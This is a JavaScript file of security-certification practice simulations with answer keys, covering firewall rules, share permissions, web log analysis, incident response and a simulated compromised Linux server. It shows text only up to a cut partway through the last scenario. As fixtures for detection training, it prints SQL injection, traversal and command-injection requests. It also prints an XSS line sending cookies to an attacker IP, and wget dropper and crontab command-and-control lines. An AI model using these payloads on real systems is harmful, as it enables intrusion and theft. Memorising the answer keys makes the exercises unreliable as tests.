/* Performance-based questions (PBQs) — original simulations. Grading logic lives in js/grading.js. */
(function () {
  var P = SEC.pbqs;

  /* ---------- 1. Firewall: DMZ web application ---------- */
  P.push({
    id: 'fw-dmz', type: 'firewall', title: 'Configure the DMZ firewall', objs: ['4.5', '3.2'], d: 2, minutes: 10,
    scenario: '<p>You are taking over a firewall that sits between the <strong>Internet</strong>, a <strong>DMZ</strong> (web server 10.0.1.10), the <strong>server segment</strong> (database 10.0.2.20, internal DNS 10.0.2.53) and the <strong>user LAN</strong> (10.0.3.0/24). The previous admin added a “temporary” rule that allows everything.</p>',
    tasks: [
      'Internet users must reach the website over HTTP and HTTPS.',
      'Only the web server may connect to the database (SQL Server, TCP 1433).',
      'Only the admin workstation may manage the web server over SSH.',
      'LAN users may browse the internet over HTTPS and use the internal DNS server (UDP 53).',
      'Block everything else, including outbound connections the web server starts toward the internet.'
    ],
    addr: {
      ANY: { label: 'Any address' },
      INET: { label: 'Internet hosts (external)' },
      WEB: { label: 'Web server 10.0.1.10 (DMZ)' },
      DB: { label: 'Database server 10.0.2.20' },
      DNS: { label: 'Internal DNS server 10.0.2.53' },
      WS: { label: 'User workstation 10.0.3.25' },
      ADM: { label: 'Admin workstation 10.0.3.5' },
      LAN: { label: 'User LAN 10.0.3.0/24 (WS + ADM)', contains: ['WS', 'ADM'] },
      SRV: { label: 'Server segment 10.0.2.0/24 (DB + DNS)', contains: ['DB', 'DNS'] }
    },
    protos: ['TCP', 'UDP', 'ICMP', 'ANY'],
    ports: ['ANY', '22', '53', '80', '443', '1433', '3389', '4444'],
    portLabels: { '22': 'SSH', '53': 'DNS', '80': 'HTTP', '443': 'HTTPS', '1433': 'MS SQL', '3389': 'RDP', '4444': 'unassigned' },
    initial: [
      { action: 'ALLOW', proto: 'ANY', src: 'ANY', dst: 'ANY', port: 'ANY' },
      { action: 'ALLOW', proto: 'TCP', src: 'INET', dst: 'WEB', port: '443' }
    ],
    maxRules: 9,
    tests: [
      { desc: 'Internet → web server, HTTPS (TCP 443)', proto: 'TCP', src: 'INET', dst: 'WEB', port: '443', expect: 'ALLOW', why: 'Public website access is required.' },
      { desc: 'Internet → web server, HTTP (TCP 80)', proto: 'TCP', src: 'INET', dst: 'WEB', port: '80', expect: 'ALLOW', why: 'HTTP is required (typically to redirect to HTTPS).' },
      { desc: 'Web server → database (TCP 1433)', proto: 'TCP', src: 'WEB', dst: 'DB', port: '1433', expect: 'ALLOW', why: 'The application tier needs its database.' },
      { desc: 'Internet → database (TCP 1433)', proto: 'TCP', src: 'INET', dst: 'DB', port: '1433', expect: 'DENY', why: 'Databases must never be reachable from the internet.' },
      { desc: 'User workstation → database (TCP 1433)', proto: 'TCP', src: 'WS', dst: 'DB', port: '1433', expect: 'DENY', why: 'Only the web server needs database access (least privilege).' },
      { desc: 'Admin workstation → web server, SSH (TCP 22)', proto: 'TCP', src: 'ADM', dst: 'WEB', port: '22', expect: 'ALLOW', why: 'Administration is permitted only from the admin workstation.' },
      { desc: 'User workstation → web server, SSH (TCP 22)', proto: 'TCP', src: 'WS', dst: 'WEB', port: '22', expect: 'DENY', why: 'Ordinary users must not manage servers.' },
      { desc: 'Internet → web server, SSH (TCP 22)', proto: 'TCP', src: 'INET', dst: 'WEB', port: '22', expect: 'DENY', why: 'Exposing SSH to the internet invites brute-force attacks.' },
      { desc: 'User workstation → internet, HTTPS (TCP 443)', proto: 'TCP', src: 'WS', dst: 'INET', port: '443', expect: 'ALLOW', why: 'Users may browse the web over HTTPS.' },
      { desc: 'User workstation → internal DNS (UDP 53)', proto: 'UDP', src: 'WS', dst: 'DNS', port: '53', expect: 'ALLOW', why: 'Name resolution is required.' },
      { desc: 'Web server → internet (TCP 4444)', proto: 'TCP', src: 'WEB', dst: 'INET', port: '4444', expect: 'DENY', why: 'A web server starting outbound connections is a classic sign of a reverse shell.' },
      { desc: 'Internet → user workstation, RDP (TCP 3389)', proto: 'TCP', src: 'INET', dst: 'WS', port: '3389', expect: 'DENY', why: 'RDP must never be exposed to the internet.' }
    ],
    solution: {
      rules: [
        { action: 'ALLOW', proto: 'TCP', src: 'INET', dst: 'WEB', port: '443' },
        { action: 'ALLOW', proto: 'TCP', src: 'INET', dst: 'WEB', port: '80' },
        { action: 'ALLOW', proto: 'TCP', src: 'WEB', dst: 'DB', port: '1433' },
        { action: 'ALLOW', proto: 'TCP', src: 'ADM', dst: 'WEB', port: '22' },
        { action: 'ALLOW', proto: 'TCP', src: 'LAN', dst: 'INET', port: '443' },
        { action: 'ALLOW', proto: 'UDP', src: 'LAN', dst: 'DNS', port: '53' }
      ],
      steps: [
        'Delete the “ALLOW ANY ANY ANY ANY” rule. Because the first match wins, it lets every flow through and makes every rule below it pointless.',
        'Allow TCP 443 and TCP 80 from <code>INET</code> to <code>WEB</code> only. Don’t open the whole DMZ.',
        'Allow TCP 1433 from <code>WEB</code> to <code>DB</code> only. The source must be the web server, not ANY or the LAN.',
        'Allow TCP 22 from <code>ADM</code> (not the whole LAN) to <code>WEB</code>.',
        'Allow LAN → internet on TCP 443 and LAN → internal DNS on UDP 53.',
        'Rely on the implicit deny for everything else (internet → DB, web server outbound, RDP from the internet). Many teams also add an explicit logged “DENY ANY ANY” at the end.'
      ],
      alt: 'The grader checks behavior, not exact rows. For example, “ALLOW TCP ANY → WEB 443” also passes, because letting internal users reach the public site over HTTPS is harmless. An explicit final DENY ANY rule is also accepted.'
    }
  });

  /* ---------- 2. Firewall: IoT camera segmentation ---------- */
  P.push({
    id: 'fw-iot', type: 'firewall', title: 'Segment the IoT camera network', objs: ['2.5', '3.2'], d: 2, minutes: 8,
    scenario: '<p>Security cameras (VLAN 40) currently have unrestricted network access. A recent advisory says this camera model contains a backdoor. Restrict the camera VLAN so cameras can do only their job.</p>',
    tasks: [
      'Cameras must stream video to the network video recorder (NVR) using RTSP (TCP 554).',
      'Only the security desk workstation may view the NVR web console (TCP 443).',
      'The NVR may download firmware only from the vendor’s update server (TCP 443).',
      'Cameras must not reach the internet or any user workstation.'
    ],
    addr: {
      ANY: { label: 'Any address' },
      INET: { label: 'Internet hosts (general)' },
      VENDOR: { label: 'Vendor update server (internet)' },
      CAMS: { label: 'Camera VLAN 10.40.0.0/24 (CAM1 + CAM2)', contains: ['CAM1', 'CAM2'] },
      CAM1: { label: 'Camera 1 10.40.0.11' },
      CAM2: { label: 'Camera 2 10.40.0.12' },
      NVR: { label: 'Network video recorder 10.20.0.5' },
      SEC: { label: 'Security desk workstation 10.30.0.8' },
      WS: { label: 'General user workstation 10.30.0.50' },
      LAN: { label: 'User LAN 10.30.0.0/24 (SEC + WS)', contains: ['SEC', 'WS'] }
    },
    protos: ['TCP', 'UDP', 'ICMP', 'ANY'],
    ports: ['ANY', '22', '80', '443', '445', '554'],
    portLabels: { '22': 'SSH', '80': 'HTTP', '443': 'HTTPS', '445': 'SMB', '554': 'RTSP' },
    initial: [
      { action: 'ALLOW', proto: 'ANY', src: 'CAMS', dst: 'ANY', port: 'ANY' },
      { action: 'ALLOW', proto: 'TCP', src: 'LAN', dst: 'NVR', port: '443' }
    ],
    maxRules: 7,
    tests: [
      { desc: 'Camera 1 → NVR, RTSP (TCP 554)', proto: 'TCP', src: 'CAM1', dst: 'NVR', port: '554', expect: 'ALLOW', why: 'Video streaming is the cameras’ job.' },
      { desc: 'Camera 2 → NVR, RTSP (TCP 554)', proto: 'TCP', src: 'CAM2', dst: 'NVR', port: '554', expect: 'ALLOW', why: 'All cameras must stream.' },
      { desc: 'Camera 1 → internet (TCP 443)', proto: 'TCP', src: 'CAM1', dst: 'INET', port: '443', expect: 'DENY', why: 'A backdoored camera must not be able to call home.' },
      { desc: 'Camera 2 → user workstation, SMB (TCP 445)', proto: 'TCP', src: 'CAM2', dst: 'WS', port: '445', expect: 'DENY', why: 'Blocks lateral movement from the IoT segment.' },
      { desc: 'Security desk → NVR console (TCP 443)', proto: 'TCP', src: 'SEC', dst: 'NVR', port: '443', expect: 'ALLOW', why: 'Security staff need to view footage.' },
      { desc: 'General workstation → NVR console (TCP 443)', proto: 'TCP', src: 'WS', dst: 'NVR', port: '443', expect: 'DENY', why: 'Only the security desk needs access (least privilege).' },
      { desc: 'NVR → vendor update server (TCP 443)', proto: 'TCP', src: 'NVR', dst: 'VENDOR', port: '443', expect: 'ALLOW', why: 'Firmware updates are required.' },
      { desc: 'NVR → any other internet host (TCP 443)', proto: 'TCP', src: 'NVR', dst: 'INET', port: '443', expect: 'DENY', why: 'Limit the NVR to the one update server it needs.' },
      { desc: 'Internet → Camera 1 web interface (TCP 80)', proto: 'TCP', src: 'INET', dst: 'CAM1', port: '80', expect: 'DENY', why: 'Camera admin interfaces must never be exposed.' }
    ],
    solution: {
      rules: [
        { action: 'ALLOW', proto: 'TCP', src: 'CAMS', dst: 'NVR', port: '554' },
        { action: 'ALLOW', proto: 'TCP', src: 'SEC', dst: 'NVR', port: '443' },
        { action: 'ALLOW', proto: 'TCP', src: 'NVR', dst: 'VENDOR', port: '443' }
      ],
      steps: [
        'Remove “ALLOW ANY CAMS → ANY ANY”. It gives the backdoored cameras unrestricted access.',
        'Allow only TCP 554 from the camera VLAN (<code>CAMS</code>) to the <code>NVR</code>.',
        'Replace “LAN → NVR 443” with <code>SEC</code> → <code>NVR</code> 443. Only the security desk needs the console.',
        'Allow <code>NVR</code> → <code>VENDOR</code> on 443 for firmware. Don’t use ANY as the destination.',
        'Let the implicit deny block camera internet access and lateral movement.'
      ],
      alt: 'Writing separate rules for CAM1 and CAM2 instead of the CAMS group also passes. Adding explicit deny rules for the camera VLAN at the end is accepted too.'
    }
  });

  /* ---------- 3. Permission matrix ---------- */
  P.push({
    id: 'perm-matrix', type: 'matrix', title: 'Assign least-privilege share permissions', objs: ['4.6', '2.5'], d: 2, minutes: 8,
    scenario: '<p>An audit found that everyone has at least Read access to every file share, and a marketing contractor has Full Control of the marketing share. Rebuild the permissions using <strong>least privilege</strong>.</p>',
    tasks: [
      '<strong>HR staff</strong> maintain employee records and the company policy library. They may <em>view</em> (not change) payroll reports.',
      '<strong>Finance staff</strong> create and edit payroll files. They must not see HR records.',
      '<strong>IT help desk</strong> maintains files in the IT scripts share only.',
      '<strong>Marketing contractor</strong> edits files in Marketing assets only.',
      'Everyone must be able to read Company policies. Full Control is reserved for share administrators (not listed).'
    ],
    levels: ['None', 'Read', 'Modify', 'Full Control'],
    legend: '<strong>Read</strong> = open and copy files · <strong>Modify</strong> = read, create, edit and delete files · <strong>Full Control</strong> = Modify plus change permissions and take ownership.',
    rows: [
      { id: 'hr', label: 'HR staff' }, { id: 'fin', label: 'Finance staff' }, { id: 'it', label: 'IT help desk' }, { id: 'con', label: 'Marketing contractor', desc: 'external' }
    ],
    cols: [
      { id: 'hrrec', label: 'HR records' }, { id: 'pay', label: 'Payroll' }, { id: 'mkt', label: 'Marketing assets' }, { id: 'scr', label: 'IT scripts' }, { id: 'pol', label: 'Company policies' }
    ],
    initial: (function () {
      var c = {};
      ['hr', 'fin', 'it', 'con'].forEach(function (r) { ['hrrec', 'pay', 'mkt', 'scr', 'pol'].forEach(function (col) { c[r + ':' + col] = 'Read'; }); });
      c['con:mkt'] = 'Full Control';
      return c;
    })(),
    expect: {
      'hr:hrrec': { ok: ['Modify'], why: 'HR maintains employee records, which needs Modify. Full Control would let them change permissions.' },
      'hr:pay': { ok: ['Read'], why: 'HR may view but not change payroll reports.' },
      'hr:mkt': { ok: ['None'], why: 'No business need.' },
      'hr:scr': { ok: ['None'], why: 'No business need.' },
      'hr:pol': { ok: ['Modify'], why: 'HR maintains the policy library.' },
      'fin:hrrec': { ok: ['None'], why: 'Finance must not see HR records.' },
      'fin:pay': { ok: ['Modify'], why: 'Finance creates and edits payroll files.' },
      'fin:mkt': { ok: ['None'], why: 'No business need.' },
      'fin:scr': { ok: ['None'], why: 'No business need.' },
      'fin:pol': { ok: ['Read'], why: 'Everyone reads policies.' },
      'it:hrrec': { ok: ['None'], why: 'Help desk must not access HR data.' },
      'it:pay': { ok: ['None'], why: 'Help desk must not access payroll.' },
      'it:mkt': { ok: ['None'], why: 'No business need.' },
      'it:scr': { ok: ['Modify'], why: 'Help desk maintains scripts. Full Control isn’t needed to edit files.' },
      'it:pol': { ok: ['Read'], why: 'Everyone reads policies.' },
      'con:hrrec': { ok: ['None'], why: 'External contractors should never see HR data.' },
      'con:pay': { ok: ['None'], why: 'No business need.' },
      'con:mkt': { ok: ['Modify'], why: 'The contractor edits marketing files. Full Control would let them grant others access.' },
      'con:scr': { ok: ['None'], why: 'No business need.' },
      'con:pol': { ok: ['Read'], why: 'Everyone, including contractors, reads policies.' }
    },
    solution: {
      steps: [
        'Start from <strong>None</strong> everywhere (deny by default), then add only what each requirement needs.',
        'Give <strong>Modify</strong>, never Full Control, to the group that maintains each share: HR → HR records and policies, Finance → payroll, Help desk → IT scripts, Contractor → marketing assets.',
        'Give HR <strong>Read</strong> on payroll, because they may view but not change it.',
        'Give everyone <strong>Read</strong> on Company policies (HR already has Modify).',
        'Remove the contractor’s Full Control. With it, an outsider could change permissions and grant access to anyone.'
      ]
    }
  });

  /* ---------- 4. Web log analysis ---------- */
  P.push({
    id: 'logs-web', type: 'logs', title: 'Analyze web server logs for attacks', objs: ['2.4', '4.9'], d: 2, minutes: 10,
    scenario: '<p>The e-commerce site <code>shop.example</code> began returning errors this morning. You pulled the following entries from the web server’s access log. Identify the malicious requests and answer the questions.</p>',
    source: 'web01 /var/log/apache2/access.log (excerpt)',
    lines: [
      { id: 'l1', bad: false, text: '198.51.100.23 - - [12/Mar/2026:09:14:01] "GET /index.html HTTP/1.1" 200 5120 "Mozilla/5.0 (Windows NT 10.0)"', why: 'Normal page request.' },
      { id: 'l2', bad: false, text: '198.51.100.23 - - [12/Mar/2026:09:14:07] "GET /products?id=42 HTTP/1.1" 200 8410 "Mozilla/5.0 (Windows NT 10.0)"', why: 'Normal product lookup.' },
      { id: 'l3', bad: true, text: '203.0.113.77 - - [12/Mar/2026:09:15:22] "GET /products?id=42\' OR \'1\'=\'1 HTTP/1.1" 500 312 "sqlmap/1.8"', why: 'SQL injection test (quote and OR 1=1). The 500 error and the sqlmap user agent confirm it is malicious.' },
      { id: 'l4', bad: true, text: '203.0.113.77 - - [12/Mar/2026:09:15:41] "GET /products?id=42 UNION SELECT username,password FROM users-- HTTP/1.1" 200 9930 "sqlmap/1.8"', why: 'UNION-based SQL injection that tries to dump credentials. The 200 response and larger size suggest it may have returned data.' },
      { id: 'l5', bad: false, text: '198.51.100.61 - - [12/Mar/2026:09:16:02] "POST /login HTTP/1.1" 302 0 "Mozilla/5.0 (Macintosh)"', why: 'Normal login redirect.' },
      { id: 'l6', bad: true, text: '192.0.2.44 - - [12/Mar/2026:09:16:30] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 1840 "curl/8.4"', why: 'Directory traversal: ../ sequences try to read /etc/passwd outside the web root.' },
      { id: 'l7', bad: false, text: '198.51.100.61 - - [12/Mar/2026:09:16:33] "GET /account HTTP/1.1" 200 4021 "Mozilla/5.0 (Macintosh)"', why: 'Normal account page.' },
      { id: 'l8', bad: true, text: '192.0.2.44 - - [12/Mar/2026:09:17:05] "GET /search?q=<script>new Image().src=\'http://192.0.2.44/c?\'+document.cookie</script> HTTP/1.1" 200 6012 "curl/8.4"', why: 'Reflected XSS payload that tries to steal session cookies.' },
      { id: 'l9', bad: false, text: '198.51.100.90 - - [12/Mar/2026:09:17:11] "GET /images/logo.png HTTP/1.1" 304 0 "Mozilla/5.0 (iPhone)"', why: 'Cached image request.' },
      { id: 'l10', bad: false, text: '198.51.100.90 - - [12/Mar/2026:09:17:15] "GET /search?q=wireless+headphones HTTP/1.1" 200 7300 "Mozilla/5.0 (iPhone)"', why: 'Normal search.' },
      { id: 'l11', bad: true, text: '192.0.2.44 - - [12/Mar/2026:09:18:40] "GET /tools/ping?host=8.8.8.8;cat%20/etc/shadow HTTP/1.1" 200 2210 "curl/8.4"', why: 'Command injection: a semicolon chains an OS command onto the ping parameter.' },
      { id: 'l12', bad: false, text: '198.51.100.23 - - [12/Mar/2026:09:19:02] "GET /robots.txt HTTP/1.1" 404 196 "Mozilla/5.0 (Windows NT 10.0)"', why: 'A 404 for robots.txt is harmless. Not every error is an attack.' }
    ],
    questions: [
      { id: 'q1', kind: 'select', label: 'Which attack did 203.0.113.77 perform?', options: ['SQL injection', 'Cross-site scripting', 'Directory traversal', 'Command injection', 'CSRF'], accept: ['SQL injection'], why: 'Quotes, OR 1=1 and UNION SELECT are SQL injection signatures, and sqlmap is an automated SQLi tool.' },
      { id: 'q2', kind: 'select', label: 'The request containing <script> is an attempt at:', options: ['Reflected cross-site scripting', 'SQL injection', 'Buffer overflow', 'Replay attack'], accept: ['Reflected cross-site scripting'], why: 'Script in a URL parameter that is echoed back to the browser is reflected XSS.' },
      { id: 'q3', kind: 'select', label: 'Which detail suggests the UNION SELECT request may have succeeded?', options: ['HTTP 200 with an unusually large response size', 'The use of HTTP/1.1', 'The request came after 09:15', 'The response was cached (304)'], accept: ['HTTP 200 with an unusually large response size'], why: 'Earlier probing returned 500. A 200 with an unusually large response suggests the database returned extra rows.' },
      { id: 'q4', kind: 'select', label: 'What is the BEST immediate control to block these requests while developers fix the code?', options: ['Deploy a web application firewall (WAF) in blocking mode', 'Add a layer 4 rule allowing TCP 443', 'Enable full-disk encryption on web01', 'Install a NetFlow collector'], accept: ['Deploy a web application firewall (WAF) in blocking mode'], why: 'A WAF inspects HTTP requests for SQLi, XSS, traversal and injection patterns. The long-term fix is parameterized queries, output encoding and input validation.' }
    ],
    solution: {
      steps: [
        'Scan each request for attack signatures: quotes and <code>OR 1=1</code> or <code>UNION SELECT</code> (SQLi), <code>&lt;script&gt;</code> (XSS), <code>../</code> (traversal), <code>;</code> plus shell commands (command injection).',
        'Flag lines 3 and 4 (SQLi from 203.0.113.77 using sqlmap), line 6 (traversal), line 8 (XSS) and line 11 (command injection), the last three all from 192.0.2.44.',
        'Leave normal traffic unflagged, including the harmless 404 for robots.txt. Error codes alone don’t prove an attack.',
        'The 200 response with a large body on the UNION request suggests data may have been returned, so treat it as a possible breach and check the database logs.',
        'Contain by blocking the two source IPs and enabling WAF blocking rules. Then remediate the code with parameterized queries, output encoding and input validation.'
      ]
    }
  });

  /* ---------- 5. Network diagram control placement ---------- */
  P.push({
    id: 'net-placement', type: 'placement', layout: 'network', cols: 3, title: 'Place security controls on the network diagram', objs: ['3.2', '4.5'], d: 2, minutes: 8,
    scenario: '<p>A company is redesigning its network. Place each security control in the location where it is most effective. Some items don’t belong anywhere in a secure design. Leave those in the pool.</p>',
    tasks: ['Protect the public web application from SQL injection and XSS.', 'Give remote employees encrypted access.', 'Separate the DMZ from internal systems.', 'Monitor internal traffic without risking an outage.', 'Control administrator access to the database servers.'],
    zones: [
      { id: 'remote', fixed: true, label: 'Remote employees', icon: '👤', pos: [1, 1] },
      { id: 'inet', fixed: true, label: 'Internet', icon: '🌐', kind: 'cloud', pos: [1, 2] },
      { id: 'edge', label: 'Internet edge', desc: 'between the ISP and the DMZ', pos: [2, 2] },
      { id: 'dmzweb', label: 'In front of the web servers', desc: 'inspects HTTP/S to the app', pos: [3, 1] },
      { id: 'dmzsw', fixed: true, label: 'DMZ switch', icon: '⇄', pos: [3, 2] },
      { id: 'dmzra', label: 'Remote access termination', desc: 'in the DMZ', pos: [3, 3] },
      { id: 'web', fixed: true, label: 'Public web servers', icon: '🖥', pos: [4, 1] },
      { id: 'core', label: 'Boundary: DMZ ↔ internal', desc: 'filters traffic into the LAN', pos: [4, 2] },
      { id: 'mon', label: 'Monitoring port', desc: 'SPAN/TAP on core switch', pos: [4, 3] },
      { id: 'lan', fixed: true, label: 'Core switch / user LAN', icon: '💻', pos: [5, 2] },
      { id: 'admin', label: 'Admin path to servers', desc: 'only route for admin sessions', pos: [5, 1] },
      { id: 'srv', fixed: true, label: 'Database servers', icon: '🗄', pos: [6, 1] }
    ],
    links: [['remote', 'inet'], ['inet', 'edge'], ['edge', 'dmzsw'], ['dmzsw', 'dmzweb'], ['dmzweb', 'web'], ['dmzsw', 'dmzra'], ['dmzsw', 'core'], ['core', 'lan'], ['lan', 'mon'], ['lan', 'admin'], ['admin', 'srv']],
    tokens: [
      { id: 'ngfw', label: 'Next-generation firewall', accept: ['edge'], why: 'The perimeter NGFW filters all internet traffic before it reaches the DMZ.' },
      { id: 'waf', label: 'Web application firewall', accept: ['dmzweb'], why: 'A WAF inspects HTTP/S right in front of the web application.' },
      { id: 'lb', label: 'Load balancer', accept: ['dmzweb'], why: 'Load balancers distribute traffic across the web server pool, often alongside the WAF.' },
      { id: 'vpn', label: 'VPN concentrator', accept: ['dmzra'], why: 'Remote access VPNs terminate in the DMZ so remote sessions can be inspected before they reach the LAN.' },
      { id: 'ifw', label: 'Internal firewall', accept: ['core'], why: 'A second firewall separates the semi-trusted DMZ from internal networks (screened subnet design).' },
      { id: 'ids', label: 'IDS sensor', accept: ['mon'], why: 'A passive IDS on a SPAN/TAP port monitors traffic and can’t cause an outage.' },
      { id: 'jump', label: 'Jump server', accept: ['admin'], why: 'Admins connect to the hardened jump server, which is the only system allowed to manage database servers.' },
      { id: 'wep', label: 'Wireless AP using WEP', accept: [], why: 'WEP is broken and has no place in a secure design.' },
      { id: 'telnet', label: 'Telnet management server', accept: [], why: 'Telnet sends credentials in clear text. Use SSH instead.' }
    ],
    solution: {
      steps: [
        'Perimeter: the <strong>NGFW</strong> goes at the internet edge to filter everything entering the DMZ.',
        'Web tier: the <strong>WAF</strong> (with the <strong>load balancer</strong>) goes in front of the public web servers to inspect HTTP/S for SQLi and XSS.',
        'Remote access: the <strong>VPN concentrator</strong> terminates in the DMZ so remote sessions pass through the internal firewall before reaching the LAN.',
        'Screened subnet: the <strong>internal firewall</strong> separates the DMZ from internal networks.',
        'Visibility: the <strong>IDS sensor</strong> connects to a SPAN/TAP port. It is passive, so it can’t disrupt traffic.',
        'Administration: the <strong>jump server</strong> is the only path to database servers for admin sessions.',
        'Leave the <strong>WEP access point</strong> and <strong>Telnet server</strong> unplaced. Both are insecure.'
      ]
    }
  });

  /* ---------- 6. Incident response ordering ---------- */
  P.push({
    id: 'ir-order', type: 'ordering', title: 'Order the ransomware incident response', objs: ['4.8'], d: 2, minutes: 6,
    scenario: '<p>Ransomware has hit the finance department. Put the response actions in the correct order following the incident response process. Where two actions belong to the same phase, either order is accepted.</p>',
    items: [
      { id: 'a', rank: 1, label: 'Maintain an IR plan, contact list and tested offline backups', why: 'Preparation happens before any incident.' },
      { id: 'b', rank: 2, label: 'EDR raises an alert for mass file encryption on FIN-WS12', why: 'Detection.' },
      { id: 'c', rank: 3, label: 'Confirm a true positive and determine scope: affected hosts, shares and accounts', why: 'Analysis confirms the incident and its scope.' },
      { id: 'd', rank: 4, label: 'Isolate affected hosts and disable the compromised user account', why: 'Containment stops the spread.' },
      { id: 'e', rank: 4, label: 'Capture memory from an affected host before it is reimaged', why: 'Preserve volatile evidence during containment, before eradication destroys it.' },
      { id: 'f', rank: 5, label: 'Remove the malware, reimage hosts and patch the exploited vulnerability', why: 'Eradication removes the cause.' },
      { id: 'g', rank: 6, label: 'Restore files from clean offline backups and monitor for reinfection', why: 'Recovery returns operations to normal.' },
      { id: 'h', rank: 7, label: 'Hold a post-incident review and update the ransomware playbook', why: 'Lessons learned close the loop.' }
    ],
    initialOrder: ['f', 'b', 'h', 'd', 'a', 'g', 'c', 'e'],
    solution: {
      steps: [
        '<strong>Preparation</strong>: the plan and offline backups exist before the incident.',
        '<strong>Detection</strong>: the EDR alert.', '<strong>Analysis</strong>: confirm it is real and determine scope.',
        '<strong>Containment</strong>: isolate hosts, disable the account, and capture volatile memory before anything is wiped. These two can be in either order.',
        '<strong>Eradication</strong>: remove malware, reimage, patch.', '<strong>Recovery</strong>: restore from clean backups and monitor.',
        '<strong>Lessons learned</strong>: review and update the playbook.'
      ]
    }
  });

  /* ---------- 7. Order of volatility ---------- */
  P.push({
    id: 'volatility', type: 'ordering', title: 'Collect evidence in order of volatility', objs: ['4.8', '4.9'], d: 1, minutes: 4,
    scenario: '<p>A compromised Linux server is still running. Arrange evidence sources from <strong>most</strong> volatile (collect first) to <strong>least</strong> volatile (collect last).</p>',
    items: [
      { id: 'reg', rank: 1, label: 'CPU registers and cache', why: 'These change within nanoseconds.' },
      { id: 'ram', rank: 2, label: 'System memory (RAM)', why: 'Lost when power is removed.' },
      { id: 'net', rank: 2, label: 'Running processes and active network connections', why: 'These live in memory and change constantly. Same tier as RAM.' },
      { id: 'tmp', rank: 3, label: 'Temporary files and swap space', why: 'Overwritten frequently during operation.' },
      { id: 'disk', rank: 4, label: 'Forensic image of the hard disk', why: 'Persistent, but can be changed by continued use.' },
      { id: 'logs', rank: 5, label: 'Logs already forwarded to the remote SIEM', why: 'Stored elsewhere and relatively stable.' },
      { id: 'bak', rank: 6, label: 'Archived backup tapes', why: 'The least volatile source.' }
    ],
    initialOrder: ['disk', 'bak', 'ram', 'logs', 'reg', 'tmp', 'net'],
    solution: { steps: ['Registers/cache → RAM and process/network state (same tier) → temp/swap → disk image → remote logs → archives.', 'Collect memory before powering off or imaging the disk. Shutting down would destroy it.', 'Hash each image and record the transfer on the chain-of-custody form.'] }
  });

  /* ---------- 8. Terminal investigation ---------- */
  var authLog = (function () {
    var L = [], s = 0;
    function t(sec) { var m = 14 + Math.floor(sec / 60), ss = sec % 60; return 'Mar 12 09:' + (m < 10 ? '0' : '') + m + ':' + (ss < 10 ? '0' : '') + ss; }
    L.push('Mar 12 08:58:11 web01 sshd[1021]: Accepted publickey for admin from 10.0.3.5 port 50122 ssh2');
    L.push('Mar 12 09:02:40 web01 sshd[1188]: Failed password for root from 198.51.100.200 port 40112 ssh2');
    L.push('Mar 12 09:02:44 web01 sshd[1188]: Failed password for root from 198.51.100.200 port 40118 ssh2');
    for (var i = 0; i < 6; i++) { L.push(t(s) + ' web01 sshd[2201]: Failed password for invalid user oracle from 45.33.32.156 port ' + (51000 + i * 7) + ' ssh2'); s += 3; }
    for (var j = 0; j < 14; j++) { L.push(t(s) + ' web01 sshd[2210]: Failed password for deploy from 45.33.32.156 port ' + (51100 + j * 5) + ' ssh2'); s += 4; }
    L.push(t(s + 9) + ' web01 sshd[2299]: Accepted password for deploy from 45.33.32.156 port 51544 ssh2');
    L.push(t(s + 40) + ' web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/vi /etc/crontab');
    L.push('Mar 12 10:01:05 web01 sshd[3002]: Accepted publickey for admin from 10.0.3.5 port 50410 ssh2');
    return L.join('\n') + '\n';
  })();
  P.push({
    id: 'term-compromise', type: 'terminal', title: 'Investigate a compromised Linux web server', objs: ['4.9', '2.4', '4.8'], d: 3, minutes: 15,
    scenario: '<p>The SOC flagged unusual outbound traffic from <code>web01</code>. You have a shell on the server as <code>analyst</code>. Threat intelligence lists a malicious Linux binary with this SHA-256 hash:<br><code>9c4e1f0b7d2a5e8c3b6f9a1d4e7c0b3a6f9d2c5e8b1a4d7f0c3e6b9a2d5f8c1e</code></p>',
    tasks: ['Find the attacker’s IP and the account they compromised.', 'Count the failed password attempts from that IP before the successful login.', 'Identify the malicious process, its C2 port and the persistence mechanism.', 'Find which file matches the threat intelligence hash, and choose the next response step.'],
    host: 'web01', user: 'analyst', home: '/home/analyst', cwd: '/home/analyst',
    motd: 'web01 (Ubuntu 22.04 LTS). Authorized use only.\nTip: start with "help", then look in /var/log, /etc, /tmp and /home.',
    extraHelp: 'ps aux, netstat -antp (or ss -antp), last',
    fs: {
      '/home/analyst/README.txt': 'Incident ticket INC-4471: outbound traffic from web01 to an unknown IP on a high port.\nEvidence locations: /var/log/auth.log, /etc/crontab, /tmp, /home/deploy\n',
      '/var/log/auth.log': authLog,
      '/var/log/syslog': 'Mar 12 09:20:01 web01 CRON[2402]: (root) CMD (/tmp/.x/kworker -c 45.33.32.156:4444 >/dev/null 2>&1)\nMar 12 09:25:01 web01 CRON[2455]: (root) CMD (/tmp/.x/kworker -c 45.33.32.156:4444 >/dev/null 2>&1)\nMar 12 09:30:01 web01 CRON[2511]: (root) CMD (/usr/local/bin/backup.sh)\n',
      '/etc/crontab': 'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n# m h dom mon dow user command\n17 *  * * *  root  cd / && run-parts --report /etc/cron.hourly\n30 2  * * *  root  /usr/local/bin/backup.sh\n*/5 * * * *  root  /tmp/.x/kworker -c 45.33.32.156:4444 >/dev/null 2>&1\n',
      '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:Admin:/home/admin:/bin/bash\ndeploy:x:1001:1001:Deploy:/home/deploy:/bin/bash\nanalyst:x:1002:1002:Analyst:/home/analyst:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n',
      '/home/deploy/.bash_history': 'cd /tmp\nmkdir .x\nwget http://45.33.32.156/k.sh -O /home/deploy/k.sh\nchmod +x /home/deploy/k.sh\nsudo /home/deploy/k.sh\nsudo vi /etc/crontab\nhistory -c\n',
      '/home/deploy/k.sh': '#!/bin/sh\n# dropper\nwget -q http://45.33.32.156/kw -O /tmp/.x/kworker\nchmod +x /tmp/.x/kworker\n',
      '/tmp/.x/kworker': '\u007fELF (binary data not displayable)',
      '/usr/local/bin/backup.sh': '#!/bin/sh\ntar czf /backup/www-$(date +%F).tgz /var/www/html\n',
      '/var/www/html/index.php': '<?php include "header.php"; echo "Welcome to Example Shop"; ?>\n'
    },
    meta: {
      '/tmp/.x': 'drwxr-xr-x deploy deploy', '/tmp/.x/kworker': '-rwxr-xr-x root root',
